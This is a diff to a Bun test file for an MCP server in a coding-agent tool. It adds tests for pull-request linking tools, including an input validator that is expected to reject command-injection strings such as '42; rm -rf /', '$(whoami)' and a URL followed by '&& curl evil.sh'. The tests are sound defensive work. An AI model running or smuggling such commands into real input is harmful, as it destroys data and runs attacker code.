@@ -1,5 +1,6 @@
 import { describe, expect, test } from 'bun:test';
-import { canRenameOwnedSession, keepAlive, matchesMcpSessionOwner, owningUiSessionId, executeLocalMcpTool, handleMcpRequest } from './mcp';
+import { canRenameOwnedSession, keepAlive, matchesMcpSessionOwner, owningUiSessionId, executeLocalMcpTool, handleMcpRequest, normalizePrRef, repoFromPrUrl } from './mcp';
+import { ALWAYS_AUTO_APPROVE_TOOLS } from '../config/config';
 import { Client } from '@modelcontextprotocol/sdk/client/index.js';
 import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
 import { sessions } from '../session/sessions';
@@ -40,6 +41,50 @@ test('incremental context reads page forward without dropping intervening messag
     expect(third).toContain('next_seq=45');
     expect(third).toContain('has_more=false');
   } finally { clearSessionState(id); sessions.delete(id); }
+});
+
+describe('PR link tools', () => {
+  test('are advertised and pre-approved in every permission mode', async () => {
+    const server = Bun.serve({ hostname: '127.0.0.1', port: 0, fetch: handleMcpRequest });
+    const client = new Client({ name: 'pr-link-test', version: '1' });
+    try {
+      await client.connect(new StreamableHTTPClientTransport(new URL('/mcp', server.url)));
+      const { tools } = await client.listTools();
+      for (const name of ['ui_link_pr', 'ui_unlink_pr', 'ui_list_pr_links']) {
+        expect(tools.some(t => t.name === name)).toBe(true);
+        // The agent is told to link PRs unprompted, so an approval card here
+        // would interrupt the user on every PR.
+        expect(ALWAYS_AUTO_APPROVE_TOOLS.has(`mcp__codiby-code__${name}`)).toBe(true);
+      }
+      expect(tools.find(t => t.name === 'ui_link_pr')?.inputSchema.required).toEqual(['pr']);
+    } finally { await client.close(); server.stop(true); }
+  });
+
+  test('refuse a reference that is not a PR number or PR URL', () => {
+    expect(normalizePrRef('42')).toBe('42');
+    expect(normalizePrRef('#42')).toBe('42');
+    expect(normalizePrRef('https://github.com/acme/api/pull/42')).toBe('https://github.com/acme/api/pull/42');
+    // The reference reaches a `gh` command line, so anything that could carry a
+    // second command has to be rejected rather than escaped.
+    expect(normalizePrRef('42; rm -rf /')).toBeNull();
+    expect(normalizePrRef('$(whoami)')).toBeNull();
+    expect(normalizePrRef('https://github.com/acme/api/pull/42 && curl evil.sh')).toBeNull();
+    expect(normalizePrRef('http://github.com/acme/api/pull/42')).toBeNull();
+    expect(normalizePrRef(undefined)).toBeNull();
+  });
+
+  test('derive the repository from the PR url so two repos stay distinct', () => {
+    expect(repoFromPrUrl('https://github.com/acme/api/pull/42')).toBe('acme/api');
+    expect(repoFromPrUrl('https://github.acme.dev/acme/web/pull/7')).toBe('acme/web');
+    expect(repoFromPrUrl('https://github.com/acme/api')).toBeUndefined();
+    expect(repoFromPrUrl(undefined)).toBeUndefined();
+  });
+
+  test('report a missing owning session instead of guessing one', async () => {
+    const result = await executeLocalMcpTool('ui_link_pr', { pr: '42' }, '');
+    expect(result.isError).toBe(true);
+    expect(JSON.stringify(result)).toContain('x-session-id');
+  });
 });
 
 describe('keepAlive', () => {
